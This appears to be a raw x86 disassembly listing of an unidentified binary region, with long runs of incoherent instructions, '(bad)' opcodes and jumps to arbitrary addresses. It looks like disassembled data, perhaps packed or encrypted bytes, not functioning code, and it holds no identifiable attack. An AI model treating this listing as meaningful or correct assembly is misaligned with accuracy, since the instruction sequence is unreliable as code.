  42dd49:	sub    eax,0x2a261bd8
  42dd4e:	pop    es
  42dd4f:	mov    al,ds:0x2a4e6c40
  42dd54:	xchg   edx,eax
  42dd55:	(bad)  
  42dd56:	mov    edi,0x2ca9afa1
  42dd5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd5c:	jl     0x42ddad
  42dd5e:	lods   al,BYTE PTR ds:[esi]
  42dd5f:	jne    0x42dd48
  42dd61:	rcl    DWORD PTR [ecx+0xb],1
  42dd64:	adc    dh,dh
  42dd66:	jg     0x42dd12
  42dd68:	inc    ebx
  42dd69:	inc    ecx
  42dd6a:	cmp    esi,ecx
  42dd6c:	mov    edx,0x101a3293
  42dd71:	out    0x50,eax
  42dd73:	retf   0x8840
  42dd76:	scas   eax,DWORD PTR es:[edi]
  42dd77:	shl    DWORD PTR [ecx-0x7d],0x7
  42dd7b:	pop    esp
  42dd7c:	or     DWORD PTR [ebp-0x2fa314d4],0x12bfdf9d
  42dd86:	stos   BYTE PTR es:[edi],al
  42dd87:	fldenv [ebx-0x1436b9e1]
  42dd8d:	jnp    0x42dd14
  42dd8f:	les    edx,FWORD PTR ds:0x666ab82f
  42dd95:	hlt    
  42dd96:	mov    WORD PTR ds:0xc3917e73,?
  42dd9c:	and    bh,0xec
  42dd9f:	xor    eax,0xa0594b73
  42dda4:	jecxz  0x42dd78
  42dda6:	inc    ebp
  42dda7:	call   0x852a:0x1f1094c8
  42ddae:	or     al,dh
  42ddb0:	fnsave [ecx]
  42ddb2:	scas   al,BYTE PTR es:[edi]
  42ddb3:	popa   
  42ddb4:	push   0x9e6c6e11
  42ddb9:	xchg   ebp,eax
  42ddba:	rol    DWORD PTR [eax+edi*2-0x7f],1
  42ddbe:	xchg   ebp,eax
  42ddbf:	ror    ebp,cl
  42ddc1:	ror    BYTE PTR ds:0xff70e499,0x1c
  42ddc8:	add    ah,BYTE PTR [eax-0x6c]
  42ddcb:	jno    0x42de30
  42ddcd:	cs neg ch
  42ddd0:	call   0xd70328b0
  42ddd5:	jne    0x42dde6
  42ddd7:	cld    
  42ddd8:	mov    al,0x86
  42ddda:	xchg   ebp,eax
  42dddb:	lods   eax,DWORD PTR ds:[esi]
  42dddc:	(bad)  
  42ddde:	sbb    DWORD PTR [edx-0x1a879216],eax
  42dde4:	into   
  42dde5:	jno    0x42ddba
  42dde7:	iret   
  42dde8:	mov    ah,0x8e
  42ddea:	iret   
  42ddeb:	loop   0x42de23
  42dded:	mov    edi,edi
  42ddef:	std    
  42ddf0:	lods   eax,DWORD PTR ds:[esi]
  42ddf1:	jecxz  0x42de36
  42ddf3:	mov    edi,0xcc6eb83d
  42ddf8:	enter  0xb60b,0x2
  42ddfc:	push   ds
  42ddfd:	mov    DWORD PTR [ebx+0x305a1806],edi
  42de03:	shl    al,cl
  42de05:	dec    edx
  42de06:	dec    esi
  42de07:	dec    ebp
  42de08:	mov    ebx,DWORD PTR [ecx]
  42de0a:	ja     0x42de36
  42de0c:	pop    ecx
  42de0d:	push   ss
  42de0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de0f:	test   eax,0x0
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	inc    esi
  42de81:	and    al,dl
  42de83:	xchg   edx,eax
  42de84:	xor    bl,ch
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	ret    
  42de8d:	(bad)  
  42de8e:	aad    0x62
  42de90:	xor    eax,0xcfa5de84
  42de95:	sti    
  42de96:	xchg   ebx,esi
  42de98:	inc    esp
  42de99:	sahf   
  42de9a:	mov    fs,esi
  42de9c:	fcom   QWORD PTR [eax]
  42de9e:	push   edx
  42de9f:	cdq    
  42dea0:	cmp    al,0xf5
  42dea2:	push   ebx
  42dea3:	cmc    
  42dea4:	outs   dx,BYTE PTR ds:[esi]
  42dea5:	push   es
  42dea6:	call   0xca8205f5
  42deab:	or     BYTE PTR [ebp+0x65],al
  42deae:	xchg   edi,eax
  42deaf:	out    dx,eax
  42deb0:	inc    ecx
  42deb1:	sub    ebp,ebx
  42deb3:	and    ebx,DWORD PTR [esi+0x3b41d5f0]
  42deb9:	repnz lahf 
  42debb:	and    BYTE PTR [esi+0x4c],ch
  42debe:	mov    al,ds:0x2b9a3519
  42dec3:	lock sbb BYTE PTR [edi-0x33b10414],bh
  42deca:	or     al,0xce
  42decc:	fmul   QWORD PTR [edx-0x74]
  42decf:	and    al,dh
  42ded1:	addr16 inc edx
  42ded3:	stos   DWORD PTR es:[edi],eax
  42ded4:	js     0x42df3f
  42ded6:	fs and bl,al
  42ded9:	jmp    0x42de70
  42dedb:	sub    ebx,DWORD PTR [edx]
  42dedd:	mov    al,ds:0x2a58a6d1
  42dee2:	cmp    BYTE PTR [bx+0xae6],bl
  42dee7:	nop
  42dee8:	mov    dl,0x17
  42deea:	push   edx
  42deeb:	add    BYTE PTR [edi-0x4962997],al
  42def1:	sbb    esi,DWORD PTR [ebp-0xe]
  42def4:	push   0xffffffa7
  42def6:	stos   BYTE PTR es:[edi],al
  42def7:	xchg   DWORD PTR ds:[ebp-0x1b],esp
  42defb:	mov    dh,0xe4
  42defd:	stos   DWORD PTR es:[edi],eax
  42defe:	test   al,0x24
  42df00:	or     eax,0x5f37b34e
  42df05:	cmp    edi,ecx
  42df07:	fbld   TBYTE PTR [esi-0x1517c24a]
  42df0d:	pop    esi
  42df0e:	pop    esp
  42df0f:	jge    0x42df00
  42df11:	inc    ebp
  42df12:	aas    
  42df13:	mov    eax,0xcc3963ad
  42df18:	mov    ah,0x4b
  42df1a:	mov    ah,0x2b
  42df1c:	add    BYTE PTR [ebx],bh
  42df1e:	out    0x8d,eax
  42df20:	loop   0x42df9c
  42df22:	xor    BYTE PTR [ebx-0x37],al
  42df25:	or     al,0xf0
  42df27:	fistp  DWORD PTR [ecx-0x28]
  42df2a:	adc    edi,ebx
  42df2c:	xchg   ebp,eax
  42df2d:	shl    DWORD PTR [eax],1
  42df2f:	pop    ebp
  42df30:	in     al,dx
  42df31:	ins    DWORD PTR es:[edi],dx
  42df32:	sub    eax,0xdd7fc4b5
  42df37:	jbe    0x42df14
  42df39:	in     al,0xd4
  42df3b:	jns    0x42df58
  42df3d:	addr16 xchg edx,eax
  42df3f:	neg    BYTE PTR cs:[esi-0x14]
  42df43:	ret    0x1ae2
  42df46:	xchg   edx,eax
  42df47:	or     dh,BYTE PTR [edx]
  42df49:	out    dx,al
  42df4a:	push   ebx
  42df4b:	aas    
  42df4c:	loopne 0x42df02
  42df4e:	xchg   esp,eax
  42df4f:	dec    esi
  42df50:	push   0xd0ffe937
  42df55:	into   
  42df56:	inc    esi
  42df57:	call   0x9f12:0x5f6e1b16
  42df5e:	fsubp  st(4),st
  42df60:	sub    DWORD PTR [ecx],edi
  42df62:	dec    ecx
  42df63:	aas    
  42df64:	jle    0x42dfca
  42df66:	gs fs sti 
  42df69:	push   es
  42df6a:	call   0xf11e8ddd
  42df6f:	daa    
  42df70:	ins    DWORD PTR es:[edi],dx
  42df71:	data16 jl 0x42dfa4
  42df74:	out    0x5f,al
  42df76:	mov    dh,BYTE PTR [edx]
  42df78:	fidivr DWORD PTR [edx-0xb]
  42df7b:	call   0x5fc8c03a
  42df80:	push   0x5a7c2328
  42df85:	inc    esi
  42df86:	push   ebp
  42df87:	clc    
  42df88:	sbb    BYTE PTR [eax+0x5034603a],bh
  42df8e:	in     eax,dx
  42df8f:	push   ebx
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x41]
  42e001:	adc    eax,0xec34d967
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	call   0x7e7e4518
  42e011:	and    al,0x8f
  42e013:	cld    
  42e014:	sbb    eax,0xc37c0ca5
  42e019:	ret    
  42e01a:	test   eax,0xf42ac374
  42e01f:	retf   
  42e020:	ficomp WORD PTR ds:0xb09170c0
  42e026:	and    eax,0xc8359f65
  42e02b:	int3   
  42e02c:	cmp    BYTE PTR [esi-0x68ff67bf],0xf0
  42e033:	sub    ebx,eax
  42e035:	xchg   ecx,eax
  42e036:	or     eax,0x2e4388d2
  42e03b:	xor    al,0x23
  42e03d:	adc    eax,0xb7c86d12
  42e042:	rol    BYTE PTR [ecx+ebp*1],1
  42e045:	fnsave [esi+ebx*8-0x16020f0]
  42e04c:	in     al,0x4b
  42e04e:	repnz and ebx,DWORD PTR [ebp-0x6c]
  42e052:	cli    
  42e053:	inc    edi
  42e054:	mov    dh,0x1a
  42e056:	or     DWORD PTR [edi+0x7a30549],edx
  42e05c:	mov    esp,0x62cc433e
  42e061:	sub    BYTE PTR [edx],cl
  42e063:	mov    bh,0x81
  42e065:	inc    esi
  42e066:	scas   eax,DWORD PTR es:[edi]
  42e067:	in     al,dx
  42e068:	scas   al,BYTE PTR es:[edi]
  42e069:	test   eax,0xa36fc714
  42e06e:	jmp    0xa947f6d4
  42e073:	push   es
  42e074:	mov    al,BYTE PTR [edx]
  42e076:	cmc    
  42e077:	je     0x42e0b7
  42e079:	push   0xc1b6f392
  42e07e:	pop    edi
  42e07f:	xor    esi,DWORD PTR [edi+0x113b0339]
  42e085:	pop    esp
  42e086:	xchg   edi,eax
  42e087:	hlt    
  42e088:	dec    esi
  42e089:	jle    0x42e0da
  42e08b:	mov    ah,0xe
  42e08d:	cmp    al,cl
  42e08f:	jae    0x42e0fa
  42e091:	sar    cl,1
  42e093:	mov    ebp,0x885ec2d1
  42e098:	push   eax
  42e099:	sub    dl,dh
  42e09b:	aad    0xbb
  42e09d:	sbb    eax,0x325f6a0b
  42e0a2:	adc    esi,esp
  42e0a4:	ss ja  0x42e038
  42e0a7:	xlat   BYTE PTR ds:[ebx]
  42e0a8:	mov    bl,0x4c
  42e0aa:	ds mov al,ds:0xd79a72f5
  42e0b1:	or     BYTE PTR [ecx+0x510fc941],ch
  42e0b7:	jg     0x42e108
  42e0b9:	push   eax
  42e0ba:	ss loopne 0x42e0ad
  42e0bd:	jecxz  0x42e0a0
  42e0bf:	test   al,0x79
  42e0c1:	cdq    
  42e0c2:	stc    
  42e0c3:	mov    dh,0x4a
  42e0c5:	test   DWORD PTR [edi+0x7c],ebp
  42e0c8:	dec    edx
  42e0c9:	imul   eax,DWORD PTR [edi],0x65ffddef
  42e0cf:	ror    BYTE PTR [edx+0xa],0x8e
  42e0d3:	pop    edi
  42e0d4:	daa    
  42e0d5:	cmp    al,0x5d
  42e0d7:	sbb    al,0x22
  42e0d9:	jecxz  0x42e0ad
  42e0db:	cmp    al,BYTE PTR [edi-0x5ed09b61]
  42e0e1:	xlat   BYTE PTR ds:[ebx]
  42e0e2:	hlt    
  42e0e3:	xlat   BYTE PTR ds:[ebx]
  42e0e4:	sti    
  42e0e5:	leave  
  42e0e6:	js     0x42e135
  42e0e8:	cs adc dh,cl
  42e0eb:	ins    DWORD PTR es:[edi],dx
  42e0ec:	mov    BYTE PTR [edx-0x43c31579],0xfe
  42e0f3:	xlat   BYTE PTR ds:[ebx]
  42e0f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0f5:	push   es
  42e0f6:	mov    ebx,0xa48a9ff1
  42e0fb:	stc    
  42e0fc:	imul   edi
  42e0fe:	loopne 0x42e081
  42e100:	xchg   esp,eax
  42e101:	lods   eax,DWORD PTR ds:[esi]
  42e102:	jge    0x42e089
  42e104:	sub    al,0x2f
  42e106:	sub    ecx,DWORD PTR [eax]
  42e108:	and    edx,DWORD PTR [eax+0x4d]
  42e10b:	fild   QWORD PTR [ecx+0x41]
  42e10e:	aad    0x92
	...
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	in     al,0x41
  42e182:	xor    BYTE PTR [edx],dh
  42e184:	cmp    ch,ch
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	test   eax,edx
  42e18e:	cmp    eax,0xc5f70239
  42e193:	xor    eax,0x660ac77d
  42e198:	ds jae 0x42e154
  42e19b:	or     eax,0xfa6354be
  42e1a0:	dec    ecx
  42e1a1:	sub    esi,DWORD PTR [esi-0x36]
  42e1a4:	or     BYTE PTR [ebx+0x19],bl
  42e1a7:	shl    bh,1
  42e1a9:	xchg   ebp,eax
  42e1aa:	mov    dh,0xdd
  42e1ac:	pop    esi
  42e1ad:	cmp    al,0x88
  42e1af:	pop    esi
  42e1b0:	jge    0x42e215
  42e1b2:	push   eax
  42e1b3:	div    BYTE PTR [ecx+0x32724e67]
  42e1b9:	int3   
  42e1ba:	pusha  
  42e1bb:	pusha  
  42e1bc:	push   ss
  42e1bd:	push   ds
  42e1be:	iret   
  42e1bf:	aad    0x43
  42e1c1:	cmp    BYTE PTR [ebp+0x36],al
  42e1c4:	popf   
  42e1c5:	pusha  
  42e1c6:	mov    al,ch
  42e1c8:	stos   DWORD PTR es:[edi],eax
  42e1c9:	cld    
  42e1ca:	lock cmp ebx,DWORD PTR [ebp+0x51]
  42e1ce:	add    eax,0x58163352
  42e1d3:	xchg   ecx,eax
  42e1d4:	mov    al,0x10
  42e1d6:	inc    eax
  42e1d7:	pop    eax
  42e1d8:	xchg   eax,edx
  42e1da:	add    cl,BYTE PTR [esi]
  42e1dc:	out    dx,al
  42e1dd:	mov    bh,0x15
  42e1df:	pop    ss
  42e1e0:	fwait
  42e1e1:	ins    BYTE PTR es:[edi],dx
  42e1e2:	jbe    0x42e1ce
  42e1e4:	dec    ecx
  42e1e5:	je     0x42e181
  42e1e7:	shl    DWORD PTR [ebp+0x6bba8dea],0x2b
  42e1ee:	loop   0x42e264
  42e1f0:	adc    eax,0xed2fc251
  42e1f5:	std    
  42e1f6:	cmp    eax,0x36877053
  42e1fb:	add    ebp,DWORD PTR [edx+0x6d]
  42e1fe:	lahf   
  42e1ff:	jg     0x42e24b
  42e201:	out    dx,al
  42e202:	inc    edx
  42e203:	shr    BYTE PTR [edx+edx*2+0x4d],0x27
  42e208:	repnz stos DWORD PTR es:[edi],eax
  42e20a:	xor    al,BYTE PTR [esi+ecx*4+0x24]
  42e20e:	into   
  42e20f:	pop    edi
  42e210:	cs push cs
  42e212:	pop    esp
  42e213:	inc    edx
  42e214:	mov    edi,0x156adcc8
  42e219:	xchg   ebp,eax
  42e21a:	and    al,0x5a
  42e21c:	ss xor esi,edx
  42e21f:	xor    eax,0x84c40ea
  42e224:	jmp    0x90e6:0xf941ba9b
  42e22b:	imul   ebx,DWORD PTR [ecx+0x60],0x8b0cc619
  42e232:	loop   0x42e1bb
  42e234:	lock adc DWORD PTR [edx+0x3b6d75f1],edi
  42e23b:	cli    
  42e23c:	div    DWORD PTR [ebx-0x12a7db90]
  42e242:	mov    dh,0xbf
  42e244:	sbb    eax,0xe7b9256e
  42e249:	sub    bl,BYTE PTR [esi+0x54]
  42e24c:	cli    
  42e24d:	ror    ebx,1
  42e24f:	(bad)  
  42e250:	cmp    edi,DWORD PTR [eax-0x4e2ade05]
  42e256:	mov    cl,BYTE PTR [edi-0xb0c133b]
  42e25c:	sar    bh,0xbd
  42e25f:	jo     0x42e1eb
  42e261:	mov    edx,0x3bc8535
  42e266:	mov    dl,BYTE PTR [ebx-0x33]
  42e269:	xor    DWORD PTR [ebx],eax
  42e26b:	mov    esi,0xdc4058d3
  42e270:	pop    ebx
  42e271:	scas   al,BYTE PTR es:[edi]
  42e272:	pop    edx
  42e273:	js     0x42e25d
  42e275:	jl     0x42e26d
  42e277:	dec    esi
  42e278:	mov    edx,0x9f8d6715
  42e27d:	lods   eax,DWORD PTR ds:[esi]
  42e27e:	mov    es,WORD PTR [edx+esi*2]
  42e281:	gs test eax,0xf292b996
  42e287:	loope  0x42e2c5
  42e289:	(bad)  
  42e28a:	imul   ecx,DWORD PTR [ecx+esi*4+0x3a070a],0x0
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x13199140
  42e301:	or     eax,DWORD PTR [edi+0x1ee3ce1]
  42e307:	add    BYTE PTR [ecx+eax*1],al
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	jae    0x42e36a
  42e30e:	adc    ah,BYTE PTR [eax-0x610894ff]
  42e314:	loopne 0x42e303
  42e316:	xor    al,0xa3
  42e318:	sub    al,0x46
  42e31a:	les    ecx,FWORD PTR [edx]
  42e31c:	xchg   edx,eax
  42e31d:	into   
  42e31e:	sbb    dh,dh
  42e320:	adc    eax,0xc820db9b
  42e325:	jle    0x42e2eb
  42e327:	iret   
  42e328:	sbb    eax,0xecdb0eee
  42e32d:	lahf   
  42e32e:	adc    ah,BYTE PTR [edi+0x4f5f0326]
  42e334:	inc    ebx
  42e335:	shr    BYTE PTR [edx+0x24],0x92
  42e339:	pushf  
  42e33a:	js     0x42e3b1
  42e33c:	xchg   ecx,eax
  42e33d:	mov    bh,0xc4
  42e33f:	iret   
  42e340:	lahf   
  42e341:	xchg   ebp,eax
  42e342:	nop
  42e343:	idiv   ecx
  42e345:	std    
  42e346:	fiadd  WORD PTR [ecx+0x57]
  42e349:	cmp    ah,BYTE PTR [eax+0x6b]
  42e34c:	dec    esi
  42e34d:	jne    0x42e315
  42e34f:	pushf  
  42e350:	(bad)  [edx+ebx*4-0x7264f8f4]
  42e357:	push   eax
  42e358:	push   ebp
  42e359:	outs   dx,BYTE PTR ds:[esi]
  42e35a:	cmovb  esi,eax
  42e35d:	and    ebx,DWORD PTR [edi-0x39e0a420]
  42e363:	mov    ds,esi
  42e365:	dec    edi
  42e366:	mov    bl,0x80
  42e368:	mov    ds:0xd3db852a,eax
  42e36d:	mov    eax,ds:0xe38aa02e
  42e372:	sub    bl,BYTE PTR [ecx+edi*2-0x1c]
  42e376:	test   DWORD PTR [edx],ebx
  42e378:	adc    al,0x4a
  42e37a:	outs   dx,DWORD PTR ds:[esi]
  42e37b:	xor    eax,0xe1d1382d
  42e380:	cs cmp eax,0xfb214326
  42e386:	mov    bh,0x2e
  42e388:	add    dl,al
  42e38a:	arpl   di,bp
  42e38c:	neg    BYTE PTR [edx+0x1c]
  42e38f:	gs popa 
  42e391:	xchg   ebx,eax
  42e392:	mov    edi,0x582d5202
  42e397:	lds    ebp,FWORD PTR [esi*8+0xd1f1f3a]
  42e39e:	loopne 0x42e419
  42e3a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3a1:	dec    ebp
  42e3a2:	iret   
  42e3a3:	sahf   
  42e3a4:	pop    esp
  42e3a5:	jl     0x42e344
  42e3a7:	out    0xb2,eax
  42e3a9:	mov    bh,0xe
  42e3ab:	xchg   edx,eax
  42e3ac:	popa   
  42e3ad:	jecxz  0x42e41f
  42e3af:	hlt    
  42e3b0:	imul   ecx,ebp,0xc66e052b
  42e3b6:	pop    edx
  42e3b7:	jmp    0x629c45e0
  42e3bc:	sbb    BYTE PTR [ebx-0x34],cl
  42e3bf:	adc    esp,DWORD PTR [eax-0x586e8efd]
  42e3c5:	mov    ebp,0xde67dbf9
  42e3ca:	rcl    BYTE PTR [edx],1
  42e3cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3cd:	imul   esp,DWORD PTR [edx],0x68
  42e3d0:	jbe    0x42e431
  42e3d2:	stc    
  42e3d3:	xor    ebp,DWORD PTR [ecx+0x1cacbfc3]
  42e3d9:	mov    edi,DWORD PTR [esp+edi*2]
  42e3dc:	psrld  mm4,QWORD PTR [ebp-0xc5b786d]
  42e3e3:	pusha  
  42e3e4:	jg     0x42e421
  42e3e6:	pop    ss
  42e3e7:	xchg   ebp,eax
  42e3e8:	hlt    
  42e3e9:	sbb    eax,0x62b995d0
  42e3ee:	sub    DWORD PTR gs:[esi],esp
  42e3f1:	xchg   BYTE PTR [ebp+eax*2+0x27ec5edc],dh
  42e3f8:	add    eax,ebp
  42e3fa:	aaa    
  42e3fb:	mov    eax,0x75f0915b
  42e400:	push   ebx
  42e401:	push   ecx
  42e402:	and    eax,0xfe3c3ce4
  42e407:	dec    ecx
  42e408:	inc    esp
  42e409:	(bad)  
  42e40a:	mov    esi,0x50a4a016
  42e40f:	sbb    eax,0x0
	...
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	jmp    0x42e4fc
  42e482:	mov    ds:0x1ef400c,eax
  42e487:	add    BYTE PTR [ecx+eax*1],al
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	or     bl,BYTE PTR [edx+0x52]
  42e48f:	pop    edx
  42e490:	and    edx,DWORD PTR [edi]
  42e492:	adc    eax,0x4d82f2e
  42e497:	pop    edx
  42e498:	shl    esp,0xfa
  42e49b:	je     0x42e4ff
  42e49d:	fld    DWORD PTR [ecx-0x598a3ab]
  42e4a3:	daa    
  42e4a4:	sti    
  42e4a5:	mov    bh,0x11
  42e4a7:	lods   eax,DWORD PTR ds:[esi]
  42e4a8:	repz scas eax,DWORD PTR es:[edi]
  42e4aa:	ss in  eax,0xa0
  42e4ad:	(bad)  
  42e4ae:	xchg   ebx,eax
  42e4af:	dec    ebp
  42e4b0:	repz es or eax,0xfed3d7d0
  42e4b7:	and    al,0x99
  42e4b9:	test   DWORD PTR [edi],esp
  42e4bb:	outs   dx,BYTE PTR ds:[esi]
  42e4bc:	jmp    0x42e49b
  42e4be:	cmp    eax,0x19b71c50
  42e4c3:	jnp    0x42e44a
  42e4c5:	pop    eax
  42e4c6:	ins    DWORD PTR es:[edi],dx
  42e4c7:	cmp    dl,bl
  42e4c9:	xchg   ebp,eax
  42e4ca:	pop    esp
  42e4cb:	dec    ebp
  42e4cc:	in     eax,0xe0
  42e4ce:	stc    
  42e4cf:	xchg   DWORD PTR [edi+0x70],ebp
  42e4d2:	sbb    al,0x54
  42e4d4:	sbb    DWORD PTR [edx],ebx
  42e4d6:	xchg   ecx,eax
  42e4d7:	adc    BYTE PTR [esp+eiz*2-0xa],bl
  42e4db:	out    dx,eax
  42e4dc:	and    BYTE PTR ds:0xfe75086,cl
  42e4e2:	out    0xc8,al
  42e4e4:	jae    0x42e498
  42e4e6:	mov    al,0xde
  42e4e8:	clc    
  42e4e9:	ins    BYTE PTR es:[edi],dx
  42e4ea:	lds    esi,FWORD PTR [esi]
  42e4ec:	mov    cl,0x1
  42e4ee:	mov    DWORD PTR ss:[edi-0xc659a56],edx
  42e4f5:	dec    edx
  42e4f6:	cmp    cl,BYTE PTR [esi-0x7c]
  42e4f9:	add    BYTE PTR [ebx],dl
  42e4fb:	mov    ds:0xf8b9c6ad,al
  42e500:	sub    dl,bh
  42e502:	or     DWORD PTR [esi+0xc58c533],ebx
  42e508:	fstp   TBYTE PTR [eax-0x79]
  42e50b:	fst    DWORD PTR [ebx]
  42e50d:	jmp    0x3aec542b
  42e512:	mov    ecx,0xf0f1d20d
  42e517:	in     eax,dx
  42e518:	jecxz  0x42e577
  42e51a:	push   edx
  42e51b:	sbb    BYTE PTR [eax-0x51dc2659],dh
  42e521:	mov    ds:0xa9657163,al
  42e526:	addr16 mov ds:0x3e92,eax
  42e52a:	xchg   BYTE PTR [ebp+edi*2-0x7941fef2],ah
  42e531:	leave  
  42e532:	fs xchg ebp,eax
  42e534:	dec    edx
  42e535:	cmp    al,0x3d
  42e537:	pusha  
  42e538:	enter  0xf542,0xfd
  42e53c:	add    eax,0x614e3691
  42e541:	test   eax,0x8e4e877b
  42e546:	inc    edi
  42e547:	jno    0x42e514
  42e549:	sub    BYTE PTR [edi-0x46],al
  42e54c:	stos   BYTE PTR es:[edi],al
  42e54d:	mov    eax,ds:0x76b6eb65
  42e552:	push   0x7315b8d6
  42e557:	sub    cl,BYTE PTR [ecx-0x69facf9f]
  42e55d:	xchg   ebp,eax
  42e55e:	or     ebp,DWORD PTR [eax]
  42e560:	jbe    0x42e5ad
  42e562:	add    bl,BYTE PTR [ebx+edi*2-0x422427dc]
  42e569:	stc    
  42e56a:	push   0x86a60d17
  42e56f:	mov    al,0x39
  42e571:	sti    
  42e572:	(bad)  
  42e573:	call   0x8ef4a494
  42e578:	push   ss
  42e579:	pop    edi
  42e57a:	fdivr  QWORD PTR [ebp+0x54]
  42e57d:	push   ebp
  42e57e:	jno    0x42e508
  42e580:	adc    DWORD PTR [ecx+esi*8-0x55],edi
  42e584:	mov    DWORD PTR [esi+0x4c],ebp
  42e587:	shl    BYTE PTR ds:0x20cd8676,0xd2
  42e58e:	out    dx,al
  42e58f:	mov    al,0x0
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	dec    ebp
  42e601:	std    
  42e602:	ret    
  42e603:	cmove  esi,eax
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	scas   al,BYTE PTR es:[edi]
  42e60d:	mov    bl,0x42
  42e60f:	addr16 stc 
  42e611:	mov    ch,0xf0
  42e613:	scas   eax,DWORD PTR es:[edi]
  42e614:	xor    BYTE PTR [edx-0x3a94123a],ch
  42e61a:	jno    0x42e685
  42e61c:	inc    edx
  42e61d:	rcr    BYTE PTR [ebp-0x2e],0x3a
  42e621:	addr16 adc dl,al
  42e624:	pop    edi
  42e625:	lock cmc 
  42e627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e628:	or     dh,bh
  42e62a:	adc    bh,0xb6
  42e62d:	pop    edx
  42e62e:	pop    esi
  42e62f:	out    0x84,al
  42e631:	inc    DWORD PTR [ebx+edi*8-0x2afeac77]
  42e638:	lds    esp,FWORD PTR [edx]
  42e63a:	sbb    eax,0x29d71f65
  42e63f:	or     bh,BYTE PTR [ebx]
  42e641:	ss ins DWORD PTR es:[edi],dx
  42e643:	xor    eax,0xa2e9d5c3
  42e648:	repz push edi
  42e64a:	(bad)  
  42e64b:	jl     0x42e610
  42e64d:	jns    0x42e5f9
  42e64f:	scas   eax,DWORD PTR es:[edi]
  42e650:	addr16 mov bl,0xd9
  42e653:	mov    dl,0xc1
  42e655:	jl     0x42e638
  42e657:	xchg   DWORD PTR [edx],esi
  42e659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e65a:	fst    DWORD PTR [eax-0x3b]
  42e65d:	jmp    0xeffe1e2f
  42e662:	sahf   
  42e663:	inc    ebp
  42e664:	in     eax,0xf1
  42e666:	cmp    bh,BYTE PTR [eax+0x4471a6f4]
  42e66c:	(bad)  
  42e66d:	sbb    al,0xaf
  42e66f:	stos   DWORD PTR es:[edi],eax
  42e670:	push   es
  42e671:	and    ebp,DWORD PTR [eax+edi*1-0x7f]
  42e675:	xor    ch,BYTE PTR [esi+eax*8]
  42e678:	mov    al,ds:0x569c7c61
  42e67d:	xchg   ebx,eax
  42e67e:	sub    BYTE PTR [ebx+0x204346a6],cl
  42e684:	rol    BYTE PTR [edi-0x2e],cl
  42e687:	outs   dx,BYTE PTR ds:[esi]
  42e688:	or     BYTE PTR [esi+0x7c],dl
  42e68b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e68c:	jl     0x42e641
  42e68e:	add    al,0xe0
  42e690:	xor    edx,DWORD PTR ds:0xd7aae53e
  42e696:	cmp    eax,0xe5b50828
  42e69b:	jae    0x42e6c6
  42e69d:	inc    edi
  42e69e:	jb     0x42e634
  42e6a0:	fsub   DWORD PTR [eax+0x4aaa7ad6]
  42e6a6:	hlt    
  42e6a7:	add    eax,0x41fd2ca3
  42e6ac:	lds    ebp,FWORD PTR [ebx+0x47]
  42e6af:	or     ebx,DWORD PTR [edi]
  42e6b1:	mov    cl,0x37
  42e6b3:	cmp    al,0x98
  42e6b5:	sub    ebp,DWORD PTR [edx]
  42e6b7:	jne    0x42e6aa
  42e6b9:	ret    0xb671
  42e6bc:	mov    al,ds:0x1fbd4301
  42e6c1:	inc    ebx
  42e6c2:	loope  0x42e6aa
  42e6c4:	repnz or al,0xea
  42e6c7:	dec    ecx
  42e6c8:	or     ebp,DWORD PTR [esp+ecx*8]
  42e6cb:	adc    eax,0x6d69527f
  42e6d0:	in     eax,0x6
  42e6d2:	mov    edx,0x5b9337cf
  42e6d7:	mov    dh,0x51
  42e6d9:	fnsave [ecx-0x6]
  42e6dc:	fdiv   QWORD PTR [ecx-0x5]
  42e6df:	iret   
  42e6e0:	xchg   esi,eax
  42e6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6e3:	fcomp  DWORD PTR [ecx-0x52dab7db]
  42e6e9:	and    edx,DWORD PTR [ebp+0x6]
  42e6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6ed:	sbb    edi,esi
  42e6ef:	mov    al,0x8c
  42e6f1:	das    
